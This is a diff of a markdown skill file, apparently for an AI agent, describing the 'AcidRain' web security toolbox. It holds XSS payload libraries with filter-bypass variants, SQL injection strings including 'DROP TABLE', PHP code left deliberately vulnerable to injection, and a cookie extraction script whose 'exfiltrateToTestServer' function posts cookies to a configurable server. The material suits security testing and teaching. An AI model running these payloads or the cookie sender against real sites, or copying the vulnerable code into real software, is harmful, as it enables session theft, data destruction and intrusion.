@@ -1,23 +1,34 @@
-```markdown
 ---
 name: acidrain-xss-security-testing
-description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized security research and learning
+description: AcidRain web security toolbox for XSS analysis, JavaScript utilities, and PHP injection testing in authorized environments
 triggers:
-  - test for XSS vulnerabilities with AcidRain
-  - use AcidRain security scripts for injection testing
-  - analyze cross-site scripting with AcidRain
-  - run AcidRain XSS payloads in testing environment
-  - implement AcidRain JavaScript security utilities
-  - use AcidRain PHP injection examples
-  - explore web security testing with AcidRain
-  - set up AcidRain for authorized penetration testing
+  - use acidrain for xss testing
+  - run acidrain security scripts
+  - test xss with acidrain
+  - analyze cross-site scripting vulnerabilities
+  - setup acidrain for web security research
+  - inject test payloads with acidrain
+  - run acidrain javascript utilities
+  - configure acidrain php scripts
 ---
 
 # AcidRain XSS Security Testing Skill
 
 > Skill by [ara.so](https://ara.so) — Security Skills collection.
 
-AcidRain is a 2026 web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples for authorized security testing and hands-on learning. This skill helps you navigate and use AcidRain's scripts for legitimate security research on systems you own or have explicit permission to test.
+## Overview
+
+AcidRain is a web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples for authorized security testing and hands-on learning. It provides browser-side and server-side material organized for web security research, penetration testing education, and controlled vulnerability analysis.
+
+**Key capabilities:**
+- XSS payload generation and testing
+- JavaScript-based client-side security utilities
+- PHP server-side injection examples
+- Input validation and output encoding analysis
+- Web security research snippets
+
+**License:** GPL-3.0  
+**Primary Languages:** HTML, JavaScript, PHP
 
 ## Installation
 
@@ -28,877 +39,575 @@ git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
 cd acidrain-security-script-hub
 ```
 
-The project structure typically includes:
+Explore the directory structure:
 
-```text
+```bash
+ls -la scripts/
+# Expected directories:
+# scripts/javascript/
+# scripts/php/
+# scripts/xss/
+```
+
+## Project Structure
+
+```
 acidrain-security-script-hub/
 ├── scripts/
-│   ├── javascript/    # Client-side XSS utilities
-│   ├── php/          # Server-side testing scripts
-│   └── xss/          # XSS payload collections
-├── configs/          # Configuration files
-├── examples/         # Usage examples
-├── docs/            # Documentation
+│   ├── javascript/      # Client-side utilities
+│   ├── php/            # Server-side examples
+│   └── xss/            # XSS testing payloads
+├── configs/            # Configuration files
+├── examples/           # Usage examples
+├── docs/              # Documentation
 └── README.md
 ```
 
-## Core Components
+## JavaScript Utilities
 
-### 1. JavaScript Utilities
+### Basic XSS Payload Injection
 
-AcidRain's JavaScript utilities are designed for browser-based security testing. Use them in controlled environments with proper authorization.
-
-**Basic XSS Payload Testing:**
+Example JavaScript for testing XSS vulnerabilities in authorized environments:
 
 ```javascript
-// Example: DOM-based XSS detection script
-// Save as test-dom-xss.js in scripts/javascript/
+// scripts/javascript/xss-basic.js
+// Basic XSS test payload injector
 
-(function() {
-    'use strict';
-    
-    // Test for DOM XSS vulnerabilities
-    function testDOMXSS() {
-        const testPayload = '<img src=x onerror=alert("XSS")>';
-        const vulnerableElements = [];
-        
-        // Check common injection points
-        const inputs = document.querySelectorAll('input, textarea');
-        inputs.forEach(input => {
-            if (!input.hasAttribute('data-sanitized')) {
-                vulnerableElements.push({
-                    element: input.tagName,
-                    id: input.id || 'no-id',
-                    name: input.name || 'no-name'
-                });
-            }
-        });
-        
-        console.log('Potentially vulnerable elements:', vulnerableElements);
-        return vulnerableElements;
+function testBasicXSS(targetElement) {
+  const payloads = [
+    '<script>alert("XSS")</script>',
+    '<img src=x onerror=alert("XSS")>',
+    '<svg onload=alert("XSS")>',
+    '"><script>alert(String.fromCharCode(88,83,83))</script>'
+  ];
+  
+  payloads.forEach((payload, index) => {
+    console.log(`Testing payload ${index + 1}: ${payload}`);
+    // Inject into target element
+    if (targetElement) {
+      targetElement.innerHTML = payload;
     }
-    
-    // Execute test
-    window.acidRainTest = testDOMXSS;
-})();
+  });
+}
+
+// Usage in browser console or testing environment
+// testBasicXSS(document.getElementById('vulnerable-input'));
 ```
 
-**Cookie Extraction Utility:**
+### DOM-Based XSS Analysis
 
 ```javascript
-// Example: Cookie security analyzer
-// scripts/javascript/cookie-analyzer.js
+// scripts/javascript/dom-xss-analyzer.js
+// Analyze DOM for potential XSS sinks
 
-const AcidRainCookieAnalyzer = {
-    analyze: function() {
-        const cookies = document.cookie.split(';');
-        const analysis = [];
-        
-        cookies.forEach(cookie => {
-            const [name, value] = cookie.trim().split('=');
-            analysis.push({
-                name: name,
-                hasHttpOnly: this.checkHttpOnly(name),
-                hasSecure: this.checkSecure(name),
-                accessible: true
-            });
-        });
-        
-        return analysis;
-    },
-    
-    checkHttpOnly: function(cookieName) {
-        // HttpOnly cookies won't be accessible via JavaScript
-        // This is a limitation indicator, not a bypass
-        return false; // Always false if accessible
-    },
-    
-    checkSecure: function(cookieName) {
-        return window.location.protocol === 'https:';
-    },
-    
-    report: function() {
-        const results = this.analyze();
-        console.table(results);
-        return results;
+function analyzeDOMSinks() {
+  const sinks = {
+    innerHTML: document.querySelectorAll('[innerHTML]'),
+    outerHTML: document.querySelectorAll('[outerHTML]'),
+    document_write: 'document.write usage',
+    eval_calls: 'eval() usage'
+  };
+  
+  console.log('=== DOM XSS Sink Analysis ===');
+  
+  // Check for dangerous innerHTML usage
+  document.querySelectorAll('*').forEach(el => {
+    if (el.innerHTML && el.innerHTML.includes('<script>')) {
+      console.warn('Potential XSS sink found:', el);
     }
-};
+  });
+  
+  // Monitor URL parameters
+  const urlParams = new URLSearchParams(window.location.search);
+  urlParams.forEach((value, key) => {
+    console.log(`URL param ${key}: ${value}`);
+    if (/<[^>]*script/i.test(value)) {
+      console.error(`Dangerous script tag in parameter ${key}`);
+    }
+  });
+  
+  return sinks;
+}
 
-// Usage: AcidRainCookieAnalyzer.report()
+// Export for use in testing
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = { analyzeDOMSinks };
+}
 ```
 
-### 2. PHP Server-Side Testing
+### Cookie Extraction Utility
 
-PHP scripts in AcidRain help test server-side input validation and output encoding.
+```javascript
+// scripts/javascript/cookie-extractor.js
+// Extract and analyze cookies (for authorized testing only)
 
-**Basic Input Reflection Test:**
+function extractCookies() {
+  const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split('=');
+    acc[key] = value;
+    return acc;
+  }, {});
+  
+  console.log('Extracted cookies:', cookies);
+  
+  // Analyze cookie security flags
+  const analysis = {
+    hasHttpOnly: document.cookie.includes('HttpOnly'),
+    hasSecure: document.cookie.includes('Secure'),
+    hasSameSite: document.cookie.includes('SameSite'),
+    cookieCount: Object.keys(cookies).length
+  };
+  
+  console.log('Cookie security analysis:', analysis);
+  
+  return { cookies, analysis };
+}
+
+// Send to test server (use environment variable)
+function exfiltrateToTestServer(data) {
+  const testServerUrl = process.env.ACIDRAIN_TEST_SERVER || 'http://localhost:8080/collect';
+  
+  fetch(testServerUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  }).then(response => {
+    console.log('Data sent to test server:', response.status);
+  }).catch(err => {
+    console.error('Failed to send to test server:', err);
+  });
+}
+```
+
+## PHP Server-Side Examples
+
+### Input Validation Testing
 
 ```php
 <?php
-// Example: Input reflection vulnerability scanner
-// scripts/php/reflection-test.php
+// scripts/php/input-validator.php
+// Test input validation and sanitization
 
-class AcidRainReflectionTest {
-    private $testPayloads = [
-        '<script>alert("XSS")</script>',
-        '"><script>alert("XSS")</script>',
-        "';alert(String.fromCharCode(88,83,83))//",
-        '<img src=x onerror=alert("XSS")>',
-        'javascript:alert("XSS")'
-    ];
+class InputValidator {
     
-    public function testParameter($input) {
+    // Vulnerable version (for testing)
+    public static function vulnerableEcho($input) {
+        echo $input; // Direct output - XSS vulnerable
+    }
+    
+    // Sanitized version (secure example)
+    public static function sanitizedEcho($input) {
+        echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+    }
+    
+    // Test various payloads
+    public static function testPayloads($payloads) {
         $results = [];
         
-        foreach ($this->testPayloads as $payload) {
-            $reflected = $this->simulateReflection($input, $payload);
+        foreach ($payloads as $payload) {
             $results[] = [
-                'payload' => $payload,
-                'reflected' => $reflected,
-                'vulnerable' => $this->isVulnerable($reflected, $payload)
+                'original' => $payload,
+                'vulnerable' => $payload, // Would execute
+                'sanitized' => htmlspecialchars($payload, ENT_QUOTES, 'UTF-8'),
+                'filtered' => filter_var($payload, FILTER_SANITIZE_STRING)
             ];
         }
         
         return $results;
     }
-    
-    private function simulateReflection($input, $payload) {
-        // Simulate how application might reflect input
-        return str_replace('{{input}}', $payload, $input);
-    }
-    
-    private function isVulnerable($output, $payload) {
-        // Check if payload is reflected unescaped
-        return strpos($output, $payload) !== false;
-    }
-    
-    public function generateReport($results) {
-        echo "=== AcidRain Reflection Test Report ===\n\n";
-        foreach ($results as $result) {
-            echo "Payload: {$result['payload']}\n";
-            echo "Status: " . ($result['vulnerable'] ? "VULNERABLE" : "SAFE") . "\n";
-            echo "---\n";
-        }
-    }
 }
 
-// Usage
-$tester = new AcidRainReflectionTest();
-$results = $tester->testParameter('<div>{{input}}</div>');
-$tester->generateReport($results);
-?>
-```
-
-**SQL Injection Detection Helper:**
-
-```php
-<?php
-// scripts/php/sql-injection-detector.php
-
-class AcidRainSQLInjectionDetector {
-    private $testStrings = [
-        "' OR '1'='1",
-        "1' UNION SELECT NULL--",
-        "' AND 1=CONVERT(int, (SELECT @@version))--",
-        "admin'--",
-        "' OR 1=1--"
-    ];
-    
-    public function testInput($paramName, $value) {
-        $findings = [];
-        
-        foreach ($this->testStrings as $testString) {
-            $testValue = $value . $testString;
-            
-            $finding = [
-                'parameter' => $paramName,
-                'test_string' => $testString,
-                'test_value' => $testValue,
-                'timestamp' => date('Y-m-d H:i:s')
-            ];
-            
-            // Log for manual review
-            $findings[] = $finding;
-        }
-        
-        return $findings;
-    }
-    
-    public function logFindings($findings, $logFile = 'acidrain_sqli.log') {
-        $logPath = getenv('ACIDRAIN_LOG_PATH') ?: './logs/';
-        $fullPath = $logPath . $logFile;
-        
-        $logEntry = json_encode($findings, JSON_PRETTY_PRINT) . "\n";
-        file_put_contents($fullPath, $logEntry, FILE_APPEND);
-        
-        return $fullPath;
-    }
-}
-
-// Usage
-$detector = new AcidRainSQLInjectionDetector();
-$findings = $detector->testInput('username', 'testuser');
-$logPath = $detector->logFindings($findings);
-echo "Findings logged to: {$logPath}\n";
-?>
-```
-
-### 3. XSS Payload Collections
-
-AcidRain organizes XSS payloads for different contexts.
-
-**Payload Manager:**
-
-```javascript
-// scripts/xss/payload-manager.js
-
-const AcidRainPayloadManager = {
-    payloads: {
-        basic: [
-            '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
-            '<svg onload=alert(1)>'
-        ],
-        encoded: [
-            '&lt;script&gt;alert(1)&lt;/script&gt;',
-            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
-            '&#60;script&#62;alert(1)&#60;/script&#62;'
-        ],
-        advanced: [
-            '<iframe src="javascript:alert(1)">',
-            '<object data="javascript:alert(1)">',
-            '<embed src="data:text/html,<script>alert(1)</script>">'
-        ],
-        context_breaking: [
-            '"><script>alert(1)</script>',
-            '\';alert(1);//',
-            '`${alert(1)}`'
-        ]
-    },
-    
-    getPayloads: function(category = 'basic') {
-        return this.payloads[category] || [];
-    },
-    
-    getAllPayloads: function() {
-        return Object.values(this.payloads).flat();
-    },
-    
-    testPayload: function(payload, context = 'html') {
-        const testResults = {
-            payload: payload,
-            context: context,
-            encoded: this.encodePayload(payload, context),
-            timestamp: new Date().toISOString()
-        };
-        
-        console.log('Testing payload:', testResults);
-        return testResults;
-    },
-    
-    encodePayload: function(payload, context) {
-        switch(context) {
-            case 'html':
-                return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-            case 'url':
-                return encodeURIComponent(payload);
-            case 'js':
-                return JSON.stringify(payload);
-            default:
-                return payload;
-        }
-    }
-};
-
-// Export for Node.js or browser
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = AcidRainPayloadManager;
-}
-```
-
-## Configuration
-
-Create a configuration file for AcidRain testing sessions:
-
-```javascript
-// configs/acidrain-config.js
-
-const AcidRainConfig = {
-    // Environment settings
-    environment: process.env.ACIDRAIN_ENV || 'development',
-    
-    // Target configuration
-    target: {
-        baseUrl: process.env.TARGET_BASE_URL || 'http://localhost:8080',
-        allowedHosts: (process.env.ALLOWED_HOSTS || 'localhost').split(','),
-        timeout: parseInt(process.env.REQUEST_TIMEOUT) || 5000
-    },
-    
-    // Logging configuration
-    logging: {
-        enabled: process.env.ACIDRAIN_LOGGING === 'true',
-        logPath: process.env.ACIDRAIN_LOG_PATH || './logs/',
-        level: process.env.LOG_LEVEL || 'info'
-    },
-    
-    // Testing parameters
-    testing: {
-        maxPayloads: parseInt(process.env.MAX_PAYLOADS) || 50,
-        delayBetweenRequests: parseInt(process.env.REQUEST_DELAY) || 1000,
-        userAgent: process.env.USER_AGENT || 'AcidRain-SecurityTester/2026'
-    },
-    
-    // Safety settings
-    safety: {
-        requireAuthorization: process.env.REQUIRE_AUTH !== 'false',
-        confirmBeforeTest: process.env.CONFIRM_TESTS === 'true',
-        dryRun: process.env.DRY_RUN === 'true'
-    }
-};
-
-module.exports = AcidRainConfig;
-```
-
-PHP configuration:
-
-```php
-<?php
-// configs/acidrain-config.php
-
-return [
-    'environment' => getenv('ACIDRAIN_ENV') ?: 'development',
-    
-    'target' => [
-        'base_url' => getenv('TARGET_BASE_URL') ?: 'http://localhost:8080',
-        'allowed_hosts' => explode(',', getenv('ALLOWED_HOSTS') ?: 'localhost'),
-        'timeout' => (int)(getenv('REQUEST_TIMEOUT') ?: 5)
-    ],
-    
-    'logging' => [
-        'enabled' => getenv('ACIDRAIN_LOGGING') === 'true',
-        'log_path' => getenv('ACIDRAIN_LOG_PATH') ?: './logs/',
-        'level' => getenv('LOG_LEVEL') ?: 'info'
-    ],
-    
-    'database' => [
-        'host' => getenv('DB_HOST'),
-        'name' => getenv('DB_NAME'),
-        'user' => getenv('DB_USER'),
-        'pass' => getenv('DB_PASS')
-    ],
-    
-    'safety' => [
-        'require_authorization' => getenv('REQUIRE_AUTH') !== 'false',
-        'confirm_before_test' => getenv('CONFIRM_TESTS') === 'true',
-        'dry_run' => getenv('DRY_RUN') === 'true'
-    ]
+// Usage example
+$testPayloads = [
+    '<script>alert("XSS")</script>',
+    '"><img src=x onerror=alert(1)>',
+    "'; DROP TABLE users; --",
+    '<svg/onload=alert(1)>'
 ];
+
+$results = InputValidator::testPayloads($testPayloads);
+header('Content-Type: application/json');
+echo json_encode($results, JSON_PRETTY_PRINT);
 ?>
 ```
 
-## Common Usage Patterns
-
-### Pattern 1: XSS Vulnerability Assessment
-
-```javascript
-// Complete XSS assessment workflow
-
-const AcidRainAssessment = {
-    init: function(targetUrl) {
-        this.target = targetUrl;
-        this.results = [];
-    },
-    
-    runAssessment: async function() {
-        console.log(`Starting AcidRain assessment on ${this.target}`);
-        
-        // Step 1: Identify injection points
-        const injectionPoints = this.findInjectionPoints();
-        console.log(`Found ${injectionPoints.length} potential injection points`);
-        
-        // Step 2: Test each point
-        for (const point of injectionPoints) {
-            const result = await this.testInjectionPoint(point);
-            this.results.push(result);
-        }
-        
-        // Step 3: Generate report
-        return this.generateReport();
-    },
-    
-    findInjectionPoints: function() {
-        const points = [];
-        
-        // Find all input fields
-        document.querySelectorAll('input, textarea, select').forEach(el => {
-            points.push({
-                type: 'input',
-                element: el.tagName,
-                name: el.name,
-                id: el.id
-            });
-        });
-        
-        // Find URL parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        urlParams.forEach((value, key) => {
-            points.push({
-                type: 'url_parameter',
-                name: key,
-                value: value
-            });
-        });
-        
-        return points;
-    },
-    
-    testInjectionPoint: async function(point) {
-        const payloads = AcidRainPayloadManager.getPayloads('basic');
-        const testResults = [];
-        
-        for (const payload of payloads) {
-            const result = {
-                point: point,
-                payload: payload,
-                reflected: this.checkReflection(payload),
-                executed: this.checkExecution(payload),
-                timestamp: Date.now()
-            };
-            testResults.push(result);
-        }
-        
-        return {
-            injectionPoint: point,
-            tests: testResults
-        };
-    },
-    
-    checkReflection: function(payload) {
-        return document.body.innerHTML.includes(payload);
-    },
-    
-    checkExecution: function(payload) {
-        // In a real test, implement proper execution detection
-        return false; // Placeholder
-    },
-    
-    generateReport: function() {
-        return {
-            target: this.target,
-            timestamp: new Date().toISOString(),
-            totalTests: this.results.length,
-            results: this.results,
-            summary: this.summarizeResults()
-        };
-    },
-    
-    summarizeResults: function() {
-        const summary = {
-            vulnerable: 0,
-            safe: 0,
-            uncertain: 0
-        };
-        
-        this.results.forEach(result => {
-            const hasVulnerability = result.tests.some(t => t.reflected || t.executed);
-            if (hasVulnerability) {
-                summary.vulnerable++;
-            } else {
-                summary.safe++;
-            }
-        });
-        
-        return summary;
-    }
-};
-
-// Usage
-// AcidRainAssessment.init('https://example.com');
-// const report = await AcidRainAssessment.runAssessment();
-// console.log(report);
-```
-
-### Pattern 2: PHP Server-Side Testing
+### SQL Injection Testing Helper
 
 ```php
 <?php
-// Complete server-side security test suite
+// scripts/php/sql-injection-tester.php
+// Test SQL injection scenarios in controlled environment
 
-class AcidRainTestSuite {
-    private $config;
-    private $results = [];
+class SQLInjectionTester {
     
-    public function __construct($configPath = './configs/acidrain-config.php') {
-        $this->config = require $configPath;
+    private $testDb;
+    
+    public function __construct($dbHost, $dbName, $dbUser, $dbPass) {
+        // Use environment variables for credentials
+        $host = getenv('ACIDRAIN_DB_HOST') ?: $dbHost;
+        $name = getenv('ACIDRAIN_DB_NAME') ?: $dbName;
+        $user = getenv('ACIDRAIN_DB_USER') ?: $dbUser;
+        $pass = getenv('ACIDRAIN_DB_PASS') ?: $dbPass;
+        
+        $this->testDb = new PDO(
+            "mysql:host=$host;dbname=$name",
+            $user,
+            $pass,
+            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
+        );
     }
     
-    public function runFullSuite($targetUrl) {
-        echo "=== AcidRain Security Test Suite ===\n";
-        echo "Target: {$targetUrl}\n\n";
+    // Vulnerable query (for demonstration)
+    public function vulnerableQuery($userInput) {
+        $query = "SELECT * FROM users WHERE username = '$userInput'";
+        error_log("Vulnerable query: $query");
         
-        // Authorization check
-        if ($this->config['safety']['require_authorization']) {
-            if (!$this->confirmAuthorization()) {
-                die("Authorization not confirmed. Exiting.\n");
-            }
+        try {
+            $result = $this->testDb->query($query);
+            return $result->fetchAll(PDO::FETCH_ASSOC);
+        } catch (PDOException $e) {
+            return ['error' => $e->getMessage()];
         }
-        
-        // Run tests
-        $this->results['xss'] = $this->testXSS($targetUrl);
-        $this->results['sqli'] = $this->testSQLInjection($targetUrl);
-        $this->results['header'] = $this->testHeaderInjection($targetUrl);
-        
-        // Generate report
-        return $this->generateReport();
     }
     
-    private function confirmAuthorization() {
-        echo "Do you have authorization to test this target? (yes/no): ";
-        $handle = fopen("php://stdin", "r");
-        $line = trim(fgets($handle));
-        fclose($handle);
-        return strtolower($line) === 'yes';
+    // Secure query (prepared statement)
+    public function secureQuery($userInput) {
+        $stmt = $this->testDb->prepare(
+            "SELECT * FROM users WHERE username = :username"
+        );
+        $stmt->bindParam(':username', $userInput, PDO::PARAM_STR);
+        $stmt->execute();
+        
+        return $stmt->fetchAll(PDO::FETCH_ASSOC);
     }
     
-    private function testXSS($url) {
+    // Test common injection payloads
+    public function testPayloads() {
         $payloads = [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert("XSS")>',
-            '"><script>alert("XSS")</script>'
+            "admin' OR '1'='1",
+            "admin'--",
+            "' UNION SELECT NULL--",
+            "admin'; DROP TABLE users--"
         ];
         
         $results = [];
         foreach ($payloads as $payload) {
-            $testResult = $this->makeRequest($url, ['test' => $payload]);
-            $results[] = [
-                'payload' => $payload,
-                'reflected' => strpos($testResult, $payload) !== false,
-                'response_length' => strlen($testResult)
+            $results[$payload] = [
+                'vulnerable' => $this->vulnerableQuery($payload),
+                'secure' => $this->secureQuery($payload)
             ];
         }
         
         return $results;
-    }
-    
-    private function testSQLInjection($url) {
-        $detector = new AcidRainSQLInjectionDetector();
-        return $detector->testInput('id', '1');
-    }
-    
-    private function testHeaderInjection($url) {
-        $headers = [
-            'User-Agent' => 'AcidRain<script>alert(1)</script>',
-            'Referer' => 'javascript:alert(1)',
-            'X-Forwarded-For' => '127.0.0.1<script>alert(1)</script>'
-        ];
-        
-        $results = [];
-        foreach ($headers as $header => $value) {
-            $results[$header] = [
-                'tested' => true,
-                'payload' => $value
-            ];
-        }
-        
-        return $results;
-    }
-    
-    private function makeRequest($url, $params = []) {
-        if ($this->config['safety']['dry_run']) {
-            return "DRY RUN - No actual request made";
-        }
-        
-        $queryString = http_build_query($params);
-        $fullUrl = $url . '?' . $queryString;
-        
-        $context = stream_context_create([
-            'http' => [
-                'timeout' => $this->config['target']['timeout'],
-                'user_agent' => $this->config['testing']['userAgent']
-            ]
-        ]);
-        
-        return @file_get_contents($fullUrl, false, $context) ?: '';
-    }
-    
-    private function generateReport() {
-        $report = [
-            'timestamp' => date('Y-m-d H:i:s'),
-            'environment' => $this->config['environment'],
-            'results' => $this->results
-        ];
-        
-        if ($this->config['logging']['enabled']) {
-            $this->saveReport($report);
-        }
-        
-        return $report;
-    }
-    
-    private function saveReport($report) {
-        $logPath = $this->config['logging']['log_path'];
-        $filename = $logPath . 'acidrain_report_' . time() . '.json';
-        
-        if (!is_dir($logPath)) {
-            mkdir($logPath, 0755, true);
-        }
-        
-        file_put_contents($filename, json_encode($report, JSON_PRETTY_PRINT));
-        echo "\nReport saved to: {$filename}\n";
     }
 }
 
-// Usage
-// $suite = new AcidRainTestSuite();
-// $report = $suite->runFullSuite('http://localhost:8080/test');
-// print_r($report);
+// Initialize with environment variables
+$tester = new SQLInjectionTester(
+    'localhost',
+    'test_db',
+    'test_user',
+    'test_pass'
+);
+
+// Run tests in authorized environment only
+if (getenv('ACIDRAIN_AUTHORIZED') === 'true') {
+    $results = $tester->testPayloads();
+    echo json_encode($results, JSON_PRETTY_PRINT);
+} else {
+    echo "Unauthorized: Set ACIDRAIN_AUTHORIZED=true to run tests\n";
+}
 ?>
 ```
 
-### Pattern 3: Automated Payload Rotation
+## XSS Payload Reference
+
+### Common XSS Vectors
 
 ```javascript
-// Automated testing with payload rotation
+// scripts/xss/payload-library.js
+const XSSPayloads = {
+  
+  basic: [
+    '<script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>',
+    '<svg onload=alert(1)>',
+    '<body onload=alert(1)>'
+  ],
+  
+  encoded: [
+    '&#60;script&#62;alert(1)&#60;/script&#62;',
+    '%3Cscript%3Ealert(1)%3C/script%3E',
+    '\x3cscript\x3ealert(1)\x3c/script\x3e'
+  ],
+  
+  eventHandlers: [
+    '<input onfocus=alert(1) autofocus>',
+    '<select onfocus=alert(1) autofocus>',
+    '<textarea onfocus=alert(1) autofocus>',
+    '<keygen onfocus=alert(1) autofocus>'
+  ],
+  
+  domBased: [
+    'javascript:alert(1)',
+    'data:text/html,<script>alert(1)</script>',
+    'vbscript:msgbox(1)'
+  ],
+  
+  filterBypass: [
+    '<scr<script>ipt>alert(1)</scr</script>ipt>',
+    '<img src="x" onerror="alert(1)">',
+    '<svg><script>alert(1)</script></svg>',
+    '<<SCRIPT>alert(1)//<<SCRIPT>'
+  ]
+};
 
-class AcidRainAutomatedTester {
-    constructor(config) {
-        this.config = config;
-        this.payloadQueue = [];
-        this.results = [];
-    }
-    
-    async runAutomatedTest(target, injectionPoints) {
-        console.log('Starting automated AcidRain testing...');
-        
-        // Build payload queue
-        this.buildPayloadQueue(injectionPoints);
-        
-        // Execute tests with delays
-        for (const test of this.payloadQueue) {
-            await this.executeTest(test);
-            await this.delay(this.config.testing.delayBetweenRequests);
-        }
-        
-        return this.compileResults();
-    }
-    
-    buildPayloadQueue(injectionPoints) {
-        const allPayloads = AcidRainPayloadManager.getAllPayloads();
-        
-        injectionPoints.forEach(point => {
-            allPayloads.forEach(payload => {
-                this.payloadQueue.push({
-                    point: point,
-                    payload: payload,
-                    status: 'pending'
-                });
-            });
-        });
-        
-        console.log(`Queue built: ${this.payloadQueue.length} tests`);
-    }
-    
-    async executeTest(test) {
-        try {
-            const startTime = Date.now();
-            
-            // Simulate test execution
-            const result = await this.testPayload(test.point, test.payload);
-            
-            this.results.push({
-                ...test,
-                status: 'completed',
-                result: result,
-                duration: Date.now() - startTime
-            });
-            
-            console.log(`✓ Tested: ${test.payload.substring(0, 30)}...`);
-        } catch (error) {
-            this.results.push({
-                ...test,
-                status: 'error',
-                error: error.message
-            });
-            
-            console.error(`✗ Error testing: ${test.payload.substring(0, 30)}...`);
-        }
-    }
-    
-    async testPayload(point, payload) {
-        // Implementation depends on testing method
-        return {
-            vulnerable: false,
-            reflected: false,
-            details: 'Test completed'
-        };
-    }
-    
-    delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-    
-    compileResults() {
-        const summary = {
-            total: this.results.length,
-            completed: this.results.filter(r => r.status === 'completed').length,
-            errors: this.results.filter(r => r.status === 'error').length,
-            vulnerable: this.results.filter(r => r.result?.vulnerable).length,
-            timestamp: new Date().toISOString(),
-            results: this.results
-        };
-        
-        return summary;
-    }
+function testPayload(payload, targetUrl) {
+  console.log(`Testing payload: ${payload}`);
+  console.log(`Target: ${targetUrl}`);
+  
+  // Construct test URL
+  const testUrl = `${targetUrl}?q=${encodeURIComponent(payload)}`;
+  console.log(`Full URL: ${testUrl}`);
+  
+  return testUrl;
 }
 
-// Usage
-// const config = require('./configs/acidrain-config.js');
-// const tester = new AcidRainAutomatedTester(config);
-// const injectionPoints = [{type: 'input', name: 'search'}];
-// const results = await tester.runAutomatedTest('http://localhost:8080', injectionPoints);
+module.exports = XSSPayloads;
+```
+
+## Configuration
+
+Create a configuration file for your testing environment:
+
+```javascript
+// configs/acidrain.config.js
+module.exports = {
+  // Test environment settings
+  testServer: {
+    host: process.env.ACIDRAIN_HOST || 'localhost',
+    port: process.env.ACIDRAIN_PORT || 8080,
+    protocol: process.env.ACIDRAIN_PROTOCOL || 'http'
+  },
+  
+  // Database settings (for PHP scripts)
+  database: {
+    host: process.env.ACIDRAIN_DB_HOST || 'localhost',
+    name: process.env.ACIDRAIN_DB_NAME || 'test_db',
+    user: process.env.ACIDRAIN_DB_USER || 'test_user',
+    password: process.env.ACIDRAIN_DB_PASS || ''
+  },
+  
+  // Payload settings
+  payloads: {
+    maxLength: 1000,
+    encoding: 'utf-8',
+    timeout: 5000
+  },
+  
+  // Authorization check
+  authorized: process.env.ACIDRAIN_AUTHORIZED === 'true',
+  
+  // Logging
+  logging: {
+    level: process.env.ACIDRAIN_LOG_LEVEL || 'info',
+    file: process.env.ACIDRAIN_LOG_FILE || './acidrain.log'
+  }
+};
+```
+
+### Environment Variables
+
+```bash
+# .env.example
+ACIDRAIN_HOST=localhost
+ACIDRAIN_PORT=8080
+ACIDRAIN_PROTOCOL=http
+ACIDRAIN_TEST_SERVER=http://localhost:8080/collect
+ACIDRAIN_DB_HOST=localhost
+ACIDRAIN_DB_NAME=test_db
+ACIDRAIN_DB_USER=test_user
+ACIDRAIN_DB_PASS=your_password_here
+ACIDRAIN_AUTHORIZED=true
+ACIDRAIN_LOG_LEVEL=debug
+ACIDRAIN_LOG_FILE=./logs/acidrain.log
+```
+
+## Common Patterns
+
+### Setting Up a Test Target
+
+```bash
+# Create isolated test environment
+mkdir -p acidrain-lab
+cd acidrain-lab
+
+# Copy scripts
+cp -r ../acidrain-security-script-hub/scripts .
+
+# Start PHP development server
+php -S localhost:8080 -t ./scripts/php/
+```
+
+### Running JavaScript Tests in Browser
+
+```html
+<!-- example-test-page.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AcidRain XSS Test Page</title>
+</head>
+<body>
+    <h1>XSS Testing Environment</h1>
+    
+    <div id="vulnerable-output"></div>
+    
+    <script src="scripts/javascript/xss-basic.js"></script>
+    <script src="scripts/javascript/dom-xss-analyzer.js"></script>
+    
+    <script>
+        // Run analysis
+        window.onload = function() {
+            if (confirm('Run XSS analysis? (Authorized testing only)')) {
+                analyzeDOMSinks();
+            }
+        };
+    </script>
+</body>
+</html>
+```
+
+### Automated Testing Workflow
+
+```javascript
+// test-runner.js
+const XSSPayloads = require('./scripts/xss/payload-library.js');
+const config = require('./configs/acidrain.config.js');
+
+async function runTestSuite() {
+  if (!config.authorized) {
+    console.error('Testing not authorized. Set ACIDRAIN_AUTHORIZED=true');
+    return;
+  }
+  
+  console.log('Starting AcidRain test suite...');
+  
+  const results = {
+    passed: 0,
+    failed: 0,
+    tests: []
+  };
+  
+  // Test each payload category
+  for (const [category, payloads] of Object.entries(XSSPayloads)) {
+    console.log(`\nTesting ${category} payloads...`);
+    
+    for (const payload of payloads) {
+      const testUrl = `${config.testServer.protocol}://${config.testServer.host}:${config.testServer.port}/test?q=${encodeURIComponent(payload)}`;
+      
+      try {
+        const response = await fetch(testUrl);
+        const text = await response.text();
+        
+        const detected = text.includes(payload);
+        results.tests.push({
+          category,
+          payload,
+          detected,
+          status: detected ? 'VULNERABLE' : 'SAFE'
+        });
+        
+        if (detected) results.failed++;
+        else results.passed++;
+        
+      } catch (error) {
+        console.error(`Error testing payload: ${error.message}`);
+      }
+    }
+  }
+  
+  console.log('\n=== Test Results ===');
+  console.log(`Passed: ${results.passed}`);
+  console.log(`Failed: ${results.failed}`);
+  console.log(`Total: ${results.tests.length}`);
+  
+  return results;
+}
+
+if (require.main === module) {
+  runTestSuite().then(results => {
+    process.exit(results.failed > 0 ? 1 : 0);
+  });
+}
+
